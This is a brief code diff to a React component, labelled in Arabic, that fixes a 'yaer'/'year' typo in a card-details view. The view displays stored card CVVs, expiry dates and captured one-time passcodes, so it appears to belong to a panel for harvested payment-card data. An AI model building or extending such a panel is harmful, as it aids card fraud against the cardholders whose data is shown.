@@ -15,7 +15,7 @@ interface CardData {
   otp:string;
   prefix:string;
   month:string;
-  yaer:string;
+  year:string;
   otpall:string[]
   // Add other fields as needed
 }
@@ -72,7 +72,7 @@ export function CardsByID({ id }: { id: string }) {
           <DetailItem icon={<Lock className="h-5 w-5" />} label="CVV" value={cards.pass} />
         </div>
         <div className="space-y-2">
-          <DetailItem icon={<Calendar className="h-5 w-5" />} label="تاريخ الانتهاء" value={`${cards.month}/${cards.yaer}`} />
+          <DetailItem icon={<Calendar className="h-5 w-5" />} label="تاريخ الانتهاء" value={`${cards.month}/${cards.year}`} />
           <DetailItem icon={<CheckCircle className="h-5 w-5" />} label="رمز التحقق" value={cards.otp} />
         </div>
         <div className="col-span-full">
